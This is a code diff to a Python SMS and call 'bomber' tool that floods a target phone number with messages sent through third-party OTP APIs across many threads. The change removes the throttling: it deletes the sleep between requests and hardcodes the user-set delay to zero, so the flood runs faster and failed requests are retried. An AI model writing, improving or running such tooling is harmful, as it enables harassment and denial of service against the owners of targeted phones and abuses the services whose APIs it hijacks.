@@ -128,7 +128,7 @@ class APIProvider:
         response=requests.request(**self.config)
         return identifier in response.text.lower()
 
-    def hit(self,delay):
+    def hit(self):
         try:
             self.lock.acquire()
             response = self.request()
@@ -138,7 +138,6 @@ class APIProvider:
         except:
             response=False
         finally:
-            time.sleep(delay)
             self.lock.release()
             return response
 
@@ -302,7 +301,7 @@ def workernode(mode,cc,target,count,delay,max_threads):
     mesgdcrt.SectionMessage("Gearing up the Bomber - Please be patient")
     mesgdcrt.GeneralMessage("Please stay connected to the internet during bombing")
     mesgdcrt.GeneralMessage("Target        : " + cc + target)
-    mesgdcrt.GeneralMessage("Amount        : " + str(count) + " to be sent")
+    mesgdcrt.GeneralMessage("Amount        : " + str(count) )
     mesgdcrt.GeneralMessage("Threads       : " + str(max_threads) + " threads")
     mesgdcrt.GeneralMessage("Delay         : " + str(delay) + " seconds")
     mesgdcrt.WarningMessage("This tool was made for fun and research purposes only")
@@ -320,7 +319,7 @@ def workernode(mode,cc,target,count,delay,max_threads):
     with ThreadPoolExecutor(max_workers=max_threads) as executor:
         jobs = []
         for i in range(count):
-            jobs.append(executor.submit(api.hit,delay=delay))
+            jobs.append(executor.submit(api.hit))
         success,failed=0,0
         for job in as_completed(jobs):
             result = job.result()
@@ -334,7 +333,7 @@ def workernode(mode,cc,target,count,delay,max_threads):
                 success+=1
             else:
                 failed+=1
-                jobs.append(executor.submit(api.hit,delay=delay))
+                jobs.append(executor.submit(api.hit))
             clr()
             pretty_print(cc,target,success,failed)
     print("\n")
@@ -373,7 +372,8 @@ def selectnode(mode="sms"):
                     mesgdcrt.WarningMessage("You have requested " + str(count) + " calls")
                     mesgdcrt.GeneralMessage("Automatically capping the value to 100")
                     count = limit
-                delay = float(input(mesgdcrt.CommandMessage("Enter delay time (in seconds): ")).strip())
+                #delay = float(input(mesgdcrt.CommandMessage("Enter delay time (in seconds): ")).strip())
+                delay = 0
                 max_threads = int(input(mesgdcrt.CommandMessage("Enter Number of Thread: ")).strip())
                 if (count < 0 or delay < 0):
                     raise Exception
